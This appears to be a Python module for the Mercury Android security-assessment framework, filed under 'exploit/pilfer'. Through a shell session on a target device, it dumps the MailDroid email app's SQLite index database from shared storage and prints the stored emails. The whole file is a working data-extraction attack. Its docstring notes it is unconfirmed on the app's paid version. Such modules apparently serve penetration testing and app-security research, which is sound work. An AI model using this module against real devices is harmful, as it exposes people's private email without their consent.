from merc.lib.modules import Module
class MailDroid(Module):
    """Extracts Emails from Maildroid's Sqlite3 db
Free Version: https://play.google.com/store/apps/details?id=com.maildroid&hl=en
Paid Version: https://play.google.com/store/apps/details?id=com.maildroid.pro&hl=en
Have not confirmed this works in Paid Version yet
Henry Hoggard - MWRLabs"""
    
    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "thirdparty"]

    def execute(self, session, _arg):
	data = session.executeCommand("shell", "executeSingleCommand", {"args": "sqlite3 /sdcard/com.maildroid/index/index-1.db 'select * from idx;'"}).getPaddedErrorOrData()
	print "Extracting data from table idx..."
	print data
